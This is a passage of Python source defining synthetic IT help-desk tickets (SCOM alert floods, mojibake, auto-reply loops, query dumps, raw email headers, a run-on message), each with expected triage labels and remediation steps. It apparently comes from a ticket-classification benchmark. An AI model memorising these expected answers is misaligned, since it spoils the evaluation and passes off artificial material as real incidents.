                "Test with a different docking station to isolate whether it is dock-specific.",
            ],
            reporter_name="Priya Sharma",
            reporter_email="priya.sharma@contoso.com",
            reporter_department="Risk Management",
            channel=Channel.CHAT,
            tags=["data-cleanup", "event-log-xml", "windows-diagnostic"],
            difficulty="hard",
        ),
        # ── DC-240  Concatenated SCOM monitoring alerts ─────────────────────────
        ScenarioDefinition(
            scenario_id="DC-240",
            subject="FW: FW: FW: CRITICAL ALERTS — disk space warnings from SCOM",
            description=(
                "Hi IT,\n\n"
                "I keep getting these alerts from SCOM. Something is very wrong with our "
                "SQL server. Here are all the alerts I received this morning:\n\n"
                "--- Alert: Logical Disk Free Space is low ---\n"
                "Source: SQLPROD01.contoso.com\n"
                "Severity: Critical\n"
                "Generated: 2026-03-17 08:15:03 UTC\n"
                "Disk C: 2.1 GB free (4.2%) of 50 GB\n"
                "Resolution State: New\n"
                "Rule: Logical Disk Free Space (%) < 5\n"
                "---\n\n"
                "--- Alert: Logical Disk Free Space is low ---\n"
                "Source: SQLPROD01.contoso.com\n"
                "Severity: Critical\n"
                "Generated: 2026-03-17 08:30:04 UTC\n"
                "Disk C: 1.9 GB free (3.8%) of 50 GB\n"
                "Resolution State: New\n"
                "Rule: Logical Disk Free Space (%) < 5\n"
                "---\n\n"
                "--- Alert: Logical Disk Free Space is low ---\n"
                "Source: SQLPROD01.contoso.com\n"
                "Severity: Critical\n"
                "Generated: 2026-03-17 08:45:05 UTC\n"
                "Disk C: 1.7 GB free (3.4%) of 50 GB\n"
                "Resolution State: New\n"
                "Rule: Logical Disk Free Space (%) < 5\n"
                "---\n\n"
                "--- Alert: Logical Disk Free Space is low ---\n"
                "Source: SQLPROD01.contoso.com\n"
                "Severity: Critical\n"
                "Generated: 2026-03-17 09:00:06 UTC\n"
                "Disk C: 1.5 GB free (3.0%) of 50 GB\n"
                "Resolution State: New\n"
                "Rule: Logical Disk Free Space (%) < 5\n"
                "---\n\n"
                "--- Alert: Logical Disk Free Space is low ---\n"
                "Source: SQLPROD01.contoso.com\n"
                "Severity: Critical\n"
                "Generated: 2026-03-17 09:15:07 UTC\n"
                "Disk C: 1.3 GB free (2.6%) of 50 GB\n"
                "Resolution State: New\n"
                "Rule: Logical Disk Free Space (%) < 5\n"
                "---\n\n"
                "--- Alert: Logical Disk Free Space is low ---\n"
                "Source: SQLPROD01.contoso.com\n"
                "Severity: Critical\n"
                "Generated: 2026-03-17 09:30:08 UTC\n"
                "Disk C: 1.1 GB free (2.2%) of 50 GB\n"
                "Resolution State: New\n"
                "Rule: Logical Disk Free Space (%) < 5\n"
                "---\n\n"
                "--- Alert: Logical Disk Free Space is low ---\n"
                "Source: SQLPROD01.contoso.com\n"
                "Severity: Critical\n"
                "Generated: 2026-03-17 09:45:09 UTC\n"
                "Disk C: 0.9 GB free (1.8%) of 50 GB\n"
                "Resolution State: New\n"
                "Rule: Logical Disk Free Space (%) < 5\n"
                "---\n\n"
                "Our production SQL Server SQLPROD01 is running out of disk space on the "
                "C: drive. It's been alerting every 15 minutes since 8 AM. Please help!\n\n"
                "— David Park\nDatabase Administration"
            ),
            category=Category.DATA_STORAGE,
            priority=Priority.P1,
            team=Team.DATA_PLATFORM,
            needs_escalation=True,
            missing_info=[MissingInfo.BUSINESS_IMPACT, MissingInfo.AFFECTED_SYSTEM],
            next_best_action=(
                "Immediately address the critically low disk space on SQLPROD01 C: drive "
                "(under 5% free) — production SQL Server is at risk of failing."
            ),
            remediation_steps=[
                "Free immediate disk space by clearing temp files IIS logs and old backups on SQLPROD01.",
                "Check if SQL Server tempdb or error logs are consuming excessive C: drive space.",
                "Move any relocatable databases or logs to a dedicated data volume.",
                "Add disk capacity and update SCOM alert thresholds once resolved.",
            ],
            reporter_name="David Park",
            reporter_email="david.park@contoso.com",
            reporter_department="Database Administration",
            channel=Channel.EMAIL,
            tags=["data-cleanup", "monitoring-alert-flood", "concatenated-alerts"],
            difficulty="medium",
        ),
        # ── DC-241  Multi-encoding mojibake chain ───────────────────────────────
        ScenarioDefinition(
            scenario_id="DC-241",
            subject="Printer driver error — weird characters in error message",
            description=(
                "Hi IT Support,\n\n"
                "I am trying to install a printer driver and I keep getting errors with "
                "weird characters. The error message says:\n\n"
                "\u00e2\u0080\u0098Druckertreiber konnte nicht installiert werden\u00e2\u0080\u0099 "
                "\u00e2\u0080\u0094 Fehlercode 0x800F0214\n\n"
                "I think the original was in German but my system garbled it. I also see "
                "this in the driver installation wizard:\n\n"
                "\u00c3\u00a2\u00e2\u201a\u00ac\u00c5\u201c"
                "Cannot locate INF file"
                "\u00c3\u00a2\u00e2\u201a\u00ac\u00c2\u00a0\n\n"
                "My colleague sent me the error in an email and it got even more garbled. "
                "Here is what the email showed:\n\n"
                "\u00c3\u00a3\u00c2\u00a2\u00c3\u00a2\u00e2\u201a\u00ac\u00c5\u00a1"
                "\u00c3\u00a2\u00e2\u201a\u00ac\u00c5\u201c"
                "Driver installation failed \u00e2\u0080\u0094 Fehler beim Installieren des Treibers"
                "\u00c3\u00a3\u00c2\u00a2\u00c3\u00a2\u00e2\u201a\u00ac\u00c5\u00a1"
                "\u00c3\u00a2\u00e2\u201a\u00ac\u00c2\u00a0\n\n"
                "And then another round of garbling when I forwarded it to myself:\n\n"
                "\u00c3\u0083\u00c2\u00a3\u00c3\u0082\u00c2\u00a2"
                "\u00c3\u0083\u00c2\u00a2\u00c3\u00a2\u00e2\u201a\u00ac"
                "Treiberinstallation fehlgeschlagen \u00e2\u0080\u0094 "
                "Bitte wenden Sie sich an den Systemadministrator"
                "\u00c3\u0083\u00c2\u00a3\u00c3\u0082\u00c2\u00a2\n\n"
                "Also the Device Manager shows: \u00ef\u00bf\u00bdKonica Minolta C308 "
                "\u00ef\u00bf\u00bd \u00ef\u00bf\u00bdUniversal Print Driver "
                "\u00ef\u00bf\u00bd v4.2.1\n\n"
                "I'm trying to install the driver for our Konica Minolta C308 printer "
                "on my Windows 11 laptop and it keeps failing with error 0x800F0214.\n\n"
                "— Lena Fischer\nOperations"
            ),
            category=Category.HARDWARE,
            priority=Priority.P3,
            team=Team.ENDPOINT,
            needs_escalation=False,
            missing_info=[MissingInfo.DEVICE_INFO, MissingInfo.APPLICATION_VERSION],
            next_best_action=(
                "Troubleshoot Konica Minolta C308 printer driver installation failure with "
                "error 0x800F0214 on Windows 11 — likely a missing INF file or unsigned "
                "driver issue."
            ),
            remediation_steps=[
                "Download the correct Konica Minolta C308 driver package for Windows 11 from the manufacturer.",
                "Check if driver signing enforcement is blocking the installation.",
                "Try installing the driver through the Add Printer wizard with the Have Disk option.",
                "If 0x800F0214 persists temporarily disable driver signature enforcement and retry.",
            ],
            reporter_name="Lena Fischer",
            reporter_email="lena.fischer@contoso.com",
            reporter_department="Operations",
            channel=Channel.PORTAL,
            tags=["data-cleanup", "mojibake", "multi-encoding"],
            difficulty="hard",
        ),
        # ── DC-242  Cascading out-of-office auto-reply loop ─────────────────────
        ScenarioDefinition(
            scenario_id="DC-242",
            subject=(
                "RE: RE: RE: RE: Automatic reply: RE: Automatic reply: "
                "Meeting room booking system down"
            ),
            description=(
                "--- Automatic Reply ---\n"
                "Thank you for your email. I am currently out of the office from March "
                "15-20 with limited access to email. For urgent matters please contact "
                "help.desk@contoso.com.\n\n"
                "Regards, Amanda Chen\n\n"
                "--- Automatic Reply ---\n"
                "Thank you for contacting IT Support. This is an automated acknowledgment. "
                "Your request has been logged. A technician will respond within 4 business "
                "hours.\n\nIT Help Desk\n\n"
                "--- Automatic Reply ---\n"
                "Thank you for your email. I am currently out of the office from March "
                "15-20 with limited access to email. For urgent matters please contact "
                "help.desk@contoso.com.\n\n"
                "Regards, Amanda Chen\n\n"
                "--- Automatic Reply ---\n"
                "Thank you for contacting IT Support. This is an automated acknowledgment. "
                "Your request has been logged. A technician will respond within 4 business "
                "hours.\n\nIT Help Desk\n\n"
                "--- Automatic Reply ---\n"
                "Thank you for your email. I am currently out of the office from March "
                "15-20 with limited access to email. For urgent matters please contact "
                "help.desk@contoso.com.\n\n"
                "Regards, Amanda Chen\n\n"
                "--- Automatic Reply ---\n"
                "Thank you for contacting IT Support. This is an automated acknowledgment. "
                "Your request has been logged. A technician will respond within 4 business "
                "hours.\n\nIT Help Desk\n\n"
                "--- Automatic Reply ---\n"
                "Thank you for your email. I am currently out of the office from March "
                "15-20 with limited access to email. For urgent matters please contact "
                "help.desk@contoso.com.\n\n"
                "Regards, Amanda Chen\n\n"
                "--- Automatic Reply ---\n"
                "Thank you for contacting IT Support. This is an automated acknowledgment. "
                "Your request has been logged.\n\nIT Help Desk\n\n"
                "--- Original Message ---\n"
                "Hi IT Support,\n\n"
                "The meeting room booking system (RoomBook Pro) has been down since this "
                "morning. Nobody on Floor 7 can reserve conference rooms. Can you please "
                "look into this urgently?\n\n"
                "Thanks,\nAmanda Chen\nFacilities"
            ),
            category=Category.SOFTWARE,
            priority=Priority.P2,
            team=Team.ENTERPRISE_APPS,
            needs_escalation=False,
            missing_info=[MissingInfo.ERROR_MESSAGE, MissingInfo.AFFECTED_USERS],
            next_best_action=(
                "Investigate RoomBook Pro meeting room booking system outage reported for "
                "Floor 7 — ignore the cascading auto-reply chain and focus on restoring "
                "the booking service."
            ),
            remediation_steps=[
                "Check the RoomBook Pro application server status and logs.",
                "Verify the Exchange room mailbox integration is functioning.",
                "Restart the RoomBook Pro service if it is hung or crashed.",
                "Communicate the estimated resolution time to affected users on Floor 7.",
            ],
            reporter_name="Amanda Chen",
            reporter_email="amanda.chen@contoso.com",
            reporter_department="Facilities",
            channel=Channel.EMAIL,
            tags=["data-cleanup", "auto-reply-loop", "buried-issue"],
            difficulty="hard",
        ),
        # ── DC-243  Tab-separated query result dump ─────────────────────────────
        ScenarioDefinition(
            scenario_id="DC-243",
            subject="Database query taking 45 minutes — full result set included",
            description=(
                "Hi DBA Team,\n\n"
                "One of our queries is running extremely slow. Here is the result set "
                "so you can see what we are dealing with:\n\n"
                "trade_id\ttimestamp\tsymbol\tquantity\tprice\tstatus\taccount_id\n"
                "50001\t2026-03-17 09:30:01\tAAPL\t100\t178.42\tFILLED\tACCT-7890\n"
                "50002\t2026-03-17 09:30:01\tMSFT\t250\t415.67\tFILLED\tACCT-7891\n"
                "50003\t2026-03-17 09:30:02\tGOOG\t50\t168.23\tPARTIAL\tACCT-7892\n"
                "50004\t2026-03-17 09:30:02\tAMZN\t75\t185.91\tFILLED\tACCT-7893\n"
                "50005\t2026-03-17 09:30:03\tTSLA\t200\t242.18\tFILLED\tACCT-7894\n"
                "50006\t2026-03-17 09:30:03\tNVDA\t150\t890.45\tFILLED\tACCT-7895\n"
                "50007\t2026-03-17 09:30:04\tMETA\t300\t502.33\tFILLED\tACCT-7896\n"
                "50008\t2026-03-17 09:30:04\tJPM\t120\t198.76\tPARTIAL\tACCT-7897\n"
                "50009\t2026-03-17 09:30:05\tV\t180\t281.54\tFILLED\tACCT-7898\n"
                "50010\t2026-03-17 09:30:05\tBA\t90\t178.62\tFILLED\tACCT-7899\n"
                "50011\t2026-03-17 09:30:06\tDIS\t400\t112.87\tFILLED\tACCT-7900\n"
                "50012\t2026-03-17 09:30:06\tNFLX\t60\t612.45\tFILLED\tACCT-7901\n"
                "50013\t2026-03-17 09:30:07\tAMD\t500\t178.93\tPARTIAL\tACCT-7902\n"
                "50014\t2026-03-17 09:30:07\tINTC\t350\t42.18\tFILLED\tACCT-7903\n"
                "50015\t2026-03-17 09:30:08\tCRM\t110\t298.64\tFILLED\tACCT-7904\n"
                "50016\t2026-03-17 09:30:08\tORCL\t220\t128.37\tFILLED\tACCT-7905\n"
                "50017\t2026-03-17 09:30:09\tADBE\t80\t545.21\tFILLED\tACCT-7906\n"
                "50018\t2026-03-17 09:30:09\tPYPL\t175\t67.43\tPARTIAL\tACCT-7907\n"
                "50019\t2026-03-17 09:30:10\tSQ\t290\t78.56\tFILLED\tACCT-7908\n"
                "50020\t2026-03-17 09:30:10\tSHOP\t130\t89.12\tFILLED\tACCT-7909\n"
                "[... 24,980 more rows omitted ...]\n\n"
                "SELECT * FROM trades WHERE trade_date = '2026-03-17' takes 45 minutes "
                "on SQLPROD03. It used to run in under 10 seconds. I think the index on "
                "trade_date got dropped during last night's maintenance window.\n\n"
                "— Jason Rivera\nQuantitative Analysis"
            ),
            category=Category.DATA_STORAGE,
            priority=Priority.P2,
            team=Team.DATA_PLATFORM,
            needs_escalation=False,
            missing_info=[MissingInfo.ENVIRONMENT_DETAILS, MissingInfo.TIMESTAMP],
            next_best_action=(
                "Investigate severe query performance degradation on SQLPROD03 trades table "
                "— likely a missing index on trade_date that was dropped during maintenance."
            ),
            remediation_steps=[
                "Check the index definitions on the trades table to verify the trade_date index exists.",
                "If the index was dropped recreate it with CREATE INDEX on trade_date.",
                "Review the maintenance window scripts to identify what caused the index drop.",
                "Monitor query execution plans before and after index rebuild to confirm resolution.",
            ],
            reporter_name="Jason Rivera",
            reporter_email="jason.rivera@contoso.com",
            reporter_department="Quantitative Analysis",
            channel=Channel.CHAT,
            tags=["data-cleanup", "query-result-dump", "tabular-data"],
            difficulty="hard",
        ),
        # ── DC-244  Raw email headers flood ─────────────────────────────────────
        ScenarioDefinition(
            scenario_id="DC-244",
            subject="Outlook freezes for 30 seconds when opening emails",
            description=(
                "Hi IT,\n\n"
                "Outlook freezes every time I open an email from external senders. I "
                "copied the raw headers of a problematic email below in case it helps:\n\n"
                "Received: from MX01.contoso.com (10.0.1.50) by EX02.contoso.com "
                "(10.0.1.51) with SMTP; Mon, 17 Mar 2026 09:15:22 +0000\n"
                "Received: from mail-relay.partner.com (203.0.113.50) by MX01.contoso.com "
                "(10.0.1.50) with ESMTPS id ABC123DEF; Mon, 17 Mar 2026 09:15:20 +0000\n"
                "Received: from internal-mta.partner.com (10.200.1.25) by "
                "mail-relay.partner.com (10.200.1.1) with ESMTP id GHI456JKL; "
                "Mon, 17 Mar 2026 09:15:18 +0000\n"
                "Authentication-Results: contoso.com; spf=pass "
                "smtp.mailfrom=partner.com; dkim=pass header.d=partner.com; "
                "dmarc=pass action=none header.from=partner.com\n"
                "X-MS-Exchange-Organization-SCL: 1\n"
                "X-MS-Exchange-Organization-AuthSource: MX01.contoso.com\n"
                "X-MS-Exchange-Organization-AuthAs: Anonymous\n"
                "X-MS-Exchange-Organization-AVStamp-Enterprise: 1.0\n"
                "X-MS-Exchange-Transport-CrossTenantHeadersStamped: EX02\n"
                "X-MS-Exchange-Organization-MessageDirectionality: Incoming\n"
                "X-MS-Exchange-CrossTenant-AuthSource: MX01.contoso.com\n"
                "X-MS-Exchange-CrossTenant-Network-Message-Id: "
                "a1b2c3d4-e5f6-7890-abcd-ef1234567890\n"
                "X-MS-Exchange-CrossTenant-Id: 12345678-abcd-ef01-2345-6789abcdef01\n"
                "X-MS-Exchange-CrossTenant-OriginalArrivalTime: 17 Mar 2026 09:15:20 UTC\n"
                "X-MS-Exchange-CrossTenant-FromEntityHeader: Internet\n"
                "MIME-Version: 1.0\n"
                "Content-Type: multipart/mixed; boundary=\"----=_Part_12345_6789.1234\"\n"
                "Message-ID: <20260317091518.ABC123@internal-mta.partner.com>\n"
                "From: john.smith@partner.com\n"
                "To: emily.nakamura@contoso.com\n"
                "Subject: Q1 Partnership Review Materials\n"
                "Date: Mon, 17 Mar 2026 09:15:18 +0000\n"
                "X-Mailer: Microsoft Outlook 16.0\n"
                "X-Originating-IP: [10.200.5.42]\n"
                "Thread-Index: AQHZk2B1mN3pQ7R8sT5uV6wX9yZ0\n\n"
                "Outlook 365 on my Windows 11 laptop freezes for about 30 seconds every "
                "time I open an email from external senders. Internal emails open "
                "instantly. Started after the March patch.\n\n"
                "— Emily Nakamura\nClient Services"
            ),
            category=Category.SOFTWARE,
            priority=Priority.P3,
            team=Team.ENTERPRISE_APPS,
            needs_escalation=False,
            missing_info=[MissingInfo.APPLICATION_VERSION, MissingInfo.DEVICE_INFO],
            next_best_action=(
                "Investigate Outlook 365 freeze when opening external emails — likely a "
                "DLP or compliance policy scanning delay introduced with the March patch."
            ),
            remediation_steps=[
                "Check Outlook performance logging for the delay source when opening external emails.",
                "Review DLP and compliance policy configurations that may be scanning external mail.",
                "Test with Outlook safe mode to rule out add-in interference.",
                (
                    "Check if the March patch introduced known Outlook performance regressions "
                    "and apply any available hotfix."
                ),
            ],
            reporter_name="Emily Nakamura",
            reporter_email="emily.nakamura@contoso.com",
            reporter_department="Client Services",
            channel=Channel.EMAIL,
            tags=["data-cleanup", "raw-email-headers", "smtp-headers-dump"],
            difficulty="hard",
        ),
        # ── DC-245  Very long single paragraph with no line breaks ──────────────
        ScenarioDefinition(
            scenario_id="DC-245",
            subject="VPN certificate expired cannot connect",
            description=(
                "Hi IT support I am writing to report an issue with my VPN connection "
                "that has been affecting my ability to work remotely since yesterday "
                "morning when I tried to connect to the corporate network from my home "
                "office using the GlobalProtect VPN client on my Dell Latitude 5540 "
                "laptop running Windows 11 Pro version 23H2 and I received an error "
                "message that said something like certificate validation failed or "
                "certificate has expired I am not sure of the exact wording because I "
                "was in a hurry to join a client call but I do remember it mentioned "
                "something about the certificate and I tried clicking retry several "
                "times and it did not work so I tried restarting my laptop and that did "
                "not help either and then I tried connecting through my phone hotspot "
                "instead of my home WiFi thinking maybe it was a network issue but I "
                "got the same error on both networks which makes me think it is "
                "definitely a certificate problem and not a network problem and I asked "
                "my colleague Jennifer Park who sits next to me in the office and she "
                "said her VPN is working fine so it might just be my machine and I am "
                "supposed to work from home for the rest of this week because of a "
                "plumber appointment on Wednesday and a dentist appointment on Thursday "
                "so this is really urgent for me because I cannot access any of the "
                "internal systems including SharePoint and the HR portal and SAP and "
                "the trading platform without VPN and I have a quarterly report due on "
                "Friday that I cannot even start working on until I get VPN access back "
                "and my manager David Kim is aware of the situation and he said I should "
                "contact IT support immediately which is what I am doing now and I really "
                "hope you can help me resolve this quickly because I am falling behind "
                "on my deliverables and I also want to mention that last month I had a "
                "similar issue where the VPN client crashed every time I connected but "
                "that was fixed by reinstalling the client so I tried that too this time "
                "but the reinstall did not help because the error is about the certificate "
                "not the client software itself and I checked the certificate store in "
                "Windows and I can see there is a certificate from Contoso Corporate CA "
                "but I do not know if it is the right one or if it has expired because "
                "I am not very technical with certificates and PKI things and I hope "
                "someone from your team can remote into my machine and take a look or "
                "just tell me the steps to fix it and one more thing I noticed that when "
                "I hover over the GlobalProtect icon in the system tray it says "
                "disconnected and when I click connect it shows connecting for about ten "
                "seconds then shows the certificate error and goes back to disconnected"
            ),
            category=Category.NETWORK,
            priority=Priority.P3,
            team=Team.NETWORK_OPS,
            needs_escalation=False,
            missing_info=[MissingInfo.ERROR_MESSAGE, MissingInfo.DEVICE_INFO],
            next_best_action=(
                "Renew or reissue the expired VPN client certificate on the user's Dell "
                "Latitude 5540 — the GlobalProtect certificate validation failure prevents "
                "remote connectivity."
            ),
            remediation_steps=[
                "Check the VPN client certificate expiration date on the user's laptop.",
                "Reissue a new VPN client certificate through the certificate authority.",
                "Install the renewed certificate and verify VPN connectivity.",
                "Check if other users have the same certificate batch that may be expiring soon.",
            ],
            reporter_name="Robert Chen",
            reporter_email="robert.chen@contoso.com",
            reporter_department="Portfolio Management",
            channel=Channel.PORTAL,
            tags=["data-cleanup", "no-line-breaks", "wall-of-text"],
            difficulty="hard",
        ),
    ]
